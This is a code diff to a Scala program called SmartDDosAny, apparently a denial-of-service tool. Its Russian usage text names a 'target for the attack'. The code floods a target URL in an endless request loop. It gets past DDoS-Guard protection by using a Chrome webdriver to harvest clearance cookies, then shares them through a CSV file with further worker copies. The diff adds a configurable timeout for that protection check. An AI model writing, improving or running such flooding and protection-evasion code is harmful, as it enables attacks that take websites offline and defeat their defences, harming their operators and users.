@@ -20,7 +20,7 @@ object SmartDDosAny {
   var cookieMap = scala.collection.mutable.HashMap.empty[String, String]
   cookieMap += ("" -> "")
 
-  def innerRequest(url: String, recursion: Boolean, file: String)(implicit system: ActorSystem, executionContext: ExecutionContextExecutor): Future[Unit] = {
+  def innerRequest(url: String, recursion: Boolean, file: String)(implicit system: ActorSystem, executionContext: ExecutionContextExecutor, webDriver: ChromeDriver): Future[Unit] = {
     val str = randomQueryParam(url)
 
     Http().singleRequest(HttpRequest(uri = str).withHeaders(
@@ -57,7 +57,7 @@ object SmartDDosAny {
           println(s"Запрос новых куков...")
 
           if(headers.exists(p => p.name() == "Server" && p.value() == "ddos-guard")) {
-            fetchCookies(url, cookieMap, file)
+            fetchCookies(url, cookieMap, file, timeOut = 30000L)
 
             innerRequest(url, recursion = true, file)
           }
@@ -67,20 +67,13 @@ object SmartDDosAny {
     }
   }
 
-  def fetchCookies(url: String, cookieMap: mutable.HashMap[String, String], filePath: String, isMaster: Boolean = true) = {
+  def fetchCookies(url: String, cookieMap: mutable.HashMap[String, String], filePath: String, isMaster: Boolean = true, timeOut: Long)(implicit webDriver: ChromeDriver) = {
 
     if(isMaster) {
-      WebDriverManager.chromedriver().setup()
-
-      implicit val webDriver: ChromeDriver = {
-        System.setProperty("webdriver.chrome.silentOutput", "true")
-        new ChromeDriver()
-      }
-
       webDriver.get(url)
 
       //ждать 20 с пока пользователь пройдет ручную проверку
-      Thread.sleep(20000)
+      Thread.sleep(timeOut)
 
       webDriver.manage().getCookies.forEach {
         c =>
@@ -92,7 +85,6 @@ object SmartDDosAny {
       readCookie(cookieMap, filePath)
     }
   }
-
 
   object quoteAllFormat extends DefaultCSVFormat {
     override val quoting: Quoting = QUOTE_ALL
@@ -121,6 +113,7 @@ object SmartDDosAny {
       println("Используйте -Dmaster=false для запуска следующих копий, которые будут считывать куки из файла")
       println("Используйте -Dfile=cookie.csv путь к файлу с куками")
       println("Используйте -Dtarget=http://target.ru цель для аттаки")
+      println("Используйте -Dtimeout=30 время в секундах на прохождение ддос проверки")
       println("java -Dmaster=false -Dtarget=http://target.ru -Dfile=/cookie.csv -jar SmartDDos.jar")
       System.exit(0)
     }
@@ -136,10 +129,27 @@ object SmartDDosAny {
 
     val target = System.getProperty("target")
 
+    val timeOut = if(System.getProperties.containsKey("timeout")) {
+      System.getProperty("timeout").toLong * 1000
+    } else 30000
+
+    println(s"timeout=$timeOut")
+
     implicit val system: ActorSystem = ActorSystem()
     implicit val executionContext: ExecutionContextExecutor = system.dispatcher
 
-    fetchCookies(target, cookieMap, file, isMaster)
+    implicit var webDriver: ChromeDriver = null
+
+    if(isMaster) {
+      WebDriverManager.chromedriver().setup()
+
+      webDriver = {
+        System.setProperty("webdriver.chrome.silentOutput", "true")
+        new ChromeDriver()
+      }
+    }
+
+    fetchCookies(target, cookieMap, file, isMaster, timeOut)
 
     while (true) {
       innerRequest(target, false, file)
